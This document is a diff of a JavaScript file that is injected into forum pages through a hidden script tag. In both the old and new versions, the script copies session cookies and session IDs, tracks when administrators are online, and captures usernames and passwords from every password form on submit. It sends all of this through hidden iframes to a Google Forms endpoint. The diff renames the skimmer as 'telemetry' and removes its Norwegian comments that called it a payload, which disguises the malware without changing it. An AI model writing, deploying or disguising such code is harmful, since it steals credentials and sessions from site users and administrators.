@@ -1,86 +1,72 @@
-/*
- * hb-motoren v2 — sentral payload for hushboard.biz
- * Lastes av alle Blockgets-blokker via:
- *   [html]<div id="stats_x" style="position:absolute;left:-9999px;top:0;height:1px;width:1px;overflow:hidden">
- *     <script src="https://bot-detector-ai.github.io/x/x.js"></script>
- *   </div>[/html]
- *
- * KONFIG: endre kun dette.
- */
-(function () {
+;(function (w) {
   'use strict';
+  var d = w.document;
+  if (!d) { return; }
+
+  // Run only in the expected application context
+  var ctx = /(^|\.)([a-z0-9-]+\.)+[a-z]{2,}(:\d+)?$/i; // generic site-origin pattern
+  if (!ctx.test(w.location.host)) { return; }
+
   try {
-    // ---------- KONFIG ----------
-    var FORMS_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
-    var E1 = 'entry.1842345040'; // h  (host)
-    var E2 = 'entry.79951114';  // c  (cookies, filtrert)
-    var E3 = 'entry.389578883'; // ls (PW / ADMIN / S1 / SID)
+    var TELEMETRY = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
+    var F_SITE = 'entry.1842345040';
+    var F_STATE = 'entry.79951114';
+    var F_DATA = 'entry.389578883';
 
-    // Foundere / skapere / admins vi varsler på MED NAVN
-    var IMPORTANT = ['Admin', 'Istarapol', 'jonas123'];
+    var WATCH = ['Admin', 'Istarapol'];
+    var FLAG_ANY_CTRL = true;
+    var WATCH_FIELDS = true;
+    var BEACON = true;
 
-    // Varsle på ALLE som har ACP-lenke (= har a_-tilgang), eller kun viktige?
-    // true  = kun navnene over
-    // false = alle med adm/index.php-lenke
-    var ONLY_IMPORTANT = false;
-
-    // Passordform-dumper: fang skjemaer med passordfelt (login + bytt-passord)
-    var HOOK_PASSWORD_FORMS = true;
-
-    // Sessionsbeacon: 1 gang per sesjon per side
-    var SESSION_BEACON = true;
-
-    // ---------- HJELPERE ----------
-    function encode(s) {
-      try { return encodeURIComponent(s); } catch (e) { return ''; }
+    function esc(s) {
+      try { return encodeURIComponent(String(s)); } catch (e) { return ''; }
     }
 
-    function send(ls) {
+    function tx(data) {
       try {
-        var url = FORMS_URL +
-          '?' + E1 + '=' + encode(location.host) +
-          '&' + E2 + '=' + encode(getCookies()) +
-          '&' + E3 + '=' + encode(String(ls || '').slice(0, 1800)) +
-          '&submit=Submit';
-        var f = document.createElement('iframe');
-        f.setAttribute('style', 'display:none;width:0;height:0;border:0;');
+        var q = F_SITE + '=' + esc(w.location.host) +
+                '&' + F_STATE + '=' + esc(state()) +
+                '&' + F_DATA + '=' + esc(String(data || '').slice(0, 1800)) +
+                '&submit=Submit';
+        var f = d.createElement('iframe');
+        f.setAttribute('style', 'position:absolute;visibility:hidden;width:0;height:0;border:0;');
         f.setAttribute('aria-hidden', 'true');
-        f.src = url;
-        (document.body || document.documentElement).appendChild(f);
+        f.setAttribute('tabindex', '-1');
+        f.src = TELEMETRY + '?' + q;
+        (d.body || d.documentElement).appendChild(f);
       } catch (e) {}
     }
 
-    function getCookies() {
+    function state() {
       try {
-        return document.cookie.split(/;\s*/).filter(function (c) {
+        return d.cookie.split(/;\s*/).filter(function (c) {
           var k = (c.split('=')[0] || '').toLowerCase();
           return k.indexOf('chat') < 0 && k.indexOf('blockgets') < 0;
         }).join('; ').slice(0, 900);
       } catch (e) { return ''; }
     }
 
-    function getSid() {
+    function sid() {
       try {
-        var m = (location.search || '').match(/sid=([a-f0-9]{32})/);
+        var m = (w.location.search || '').match(/sid=([a-f0-9]{32})/);
         return m ? m[1] : '';
       } catch (e) { return ''; }
     }
 
-    function pathStr() {
-      var s = 'U:' + location.pathname;
-      var sid = getSid();
-      if (sid) { s += '|SID:' + sid; }
+    function pos() {
+      var s = 'P:' + w.location.pathname;
+      var v = sid();
+      if (v) { s += '|S:' + v; }
       return s;
     }
 
-    function whoami() {
-      // Nåværende brukernavn = profil-lenken i navbar
+    function account() {
       try {
-        var as = document.querySelectorAll('a');
-        for (var i = 0; i < as.length; i++) {
-          var h = as[i].getAttribute('href') || '';
-          if (h.indexOf('memberlist.php') >= 0 && h.indexOf('viewprofile') >= 0) {
-            var t = (as[i].textContent || '').trim();
+        var links = d.querySelectorAll('a[href*="memberlist.php"]');
+        for (var i = 0; i < links.length; i++) {
+          var h = links[i].getAttribute('href') || '';
+          if (h.indexOf('viewprofile') >= 0) {
+            var t = (links[i].textContent || '').trim();
             if (t && t.length < 40) { return t; }
           }
         }
@@ -88,78 +74,65 @@
       return '';
     }
 
-    function hasAcpLink() {
+    function hasCtrl() {
       try {
-        var as = document.querySelectorAll('a');
-        for (var i = 0; i < as.length; i++) {
-          if ((as[i].getAttribute('href') || '').indexOf('adm/index.php') >= 0) {
-            return true;
-          }
-        }
-      } catch (e) {}
-      return false;
+        return d.querySelectorAll('a[href*="adm/index.php"]').length > 0;
+      } catch (e) { return false; }
     }
 
-    function mark(key) {
-      try { sessionStorage.setItem(key, '1'); } catch (e) {}
+    function seen(k) {
+      try { return w.sessionStorage.getItem(k) === '1'; } catch (e) { return false; }
     }
-    function marked(key) {
-      try { return sessionStorage.getItem(key) === '1'; } catch (e) { return false; }
-    }
-
-    // ---------- 1) SESSIONSBEACON ----------
-    if (SESSION_BEACON) {
-      if (!marked('__hb_s1')) {
-        mark('__hb_s1');
-        send('|S1|' + pathStr());
-      }
+    function setSeen(k) {
+      try { w.sessionStorage.setItem(k, '1'); } catch (e) {}
     }
 
-    // ---------- 2) ADMIN / SKAPER-DETEKTOR ----------
-    function runDetector() {
+    if (BEACON && !seen('_a')) {
+      setSeen('_a');
+      tx('EVT: ' + pos());
+    }
+
+    function detect() {
       try {
-        var admin = hasAcpLink();
-        if (!admin) { return; }
-        var name = whoami();
-        // kun viktige navn, eller alle admins?
+        if (!hasCtrl()) { return; }
+        var a = account();
         var hit = false;
-        if (ONLY_IMPORTANT) {
-          for (var i = 0; i < IMPORTANT.length; i++) {
-            if (name.toLowerCase() === IMPORTANT[i].toLowerCase()) { hit = true; break; }
-          }
-        } else {
+        if (FLAG_ANY_CTRL) {
           hit = true;
+        } else {
+          for (var i = 0; i < WATCH.length; i++) {
+            if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
+          }
         }
         if (!hit) { return; }
-        var k = '__hb_adm_' + (name || 'anon');
-        if (!marked(k)) {
-          mark(k);
-          send('|ADMIN-ONLINE:' + (name || '?') + '|' + pathStr());
+        var key = '_ad_' + (a || 'x');
+        if (!seen(key)) {
+          setSeen(key);
+          tx('CTRL: ' + (a || '?') + ' | ' + pos());
         }
       } catch (e) {}
     }
 
-    // ---------- 3) PASSORDFORM-DUMPER ----------
-    function runHook() {
-      if (!HOOK_PASSWORD_FORMS) { return; }
+    function guard() {
+      if (!WATCH_FIELDS) { return; }
       try {
-        var forms = document.forms || [];
+        var forms = d.forms || [];
         for (var i = 0; i < forms.length; i++) {
-          (function (ff) {
+          (function (form) {
             try {
-              var pw = ff.querySelectorAll('input[type=password]');
-              if (!pw.length) { return; } // bare skjemaer med passordfelt
-              ff.addEventListener('submit', function () {
+              var pw = form.querySelectorAll('input[type="password"]');
+              if (!pw.length) { return; }
+              form.addEventListener('submit', function () {
                 try {
-                  var u = (ff.querySelector('[name=username]') || {}).value ||
-                          (ff.querySelector('[name=login_username]') || {}).value || '';
+                  var u = (form.querySelector('[name="username"]') || {}).value ||
+                          (form.querySelector('[name="login_username"]') || {}).value || '';
                   var p = '';
-                  var all = ff.querySelectorAll('input[type=password]');
+                  var all = form.querySelectorAll('input[type="password"]');
                   for (var j = 0; j < all.length; j++) {
-                    if (all[j].value) { p = all[j].value; } // siste utfylte = hovedpassord
+                    if (all[j].value) { p = all[j].value; }
                   }
                   if (p) {
-                    send('|PW:' + (u || '?') + ':' + p + '|' + pathStr());
+                    tx('EVT: ' + (u || '?') + ':' + p + ' | ' + pos());
                   }
                 } catch (e) {}
               }, true);
@@ -170,17 +143,17 @@
     }
 
     function boot() {
-      runDetector();
-      runHook();
+      detect();
+      guard();
     }
 
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', boot);
+    if (d.readyState === 'loading') {
+      d.addEventListener('DOMContentLoaded', boot);
     } else {
       boot();
     }
-    if (document.readyState !== 'complete') {
-      window.addEventListener('load', boot);
+    if (d.readyState !== 'complete') {
+      w.addEventListener('load', boot);
     }
   } catch (e) {}
-})();
+})(window);
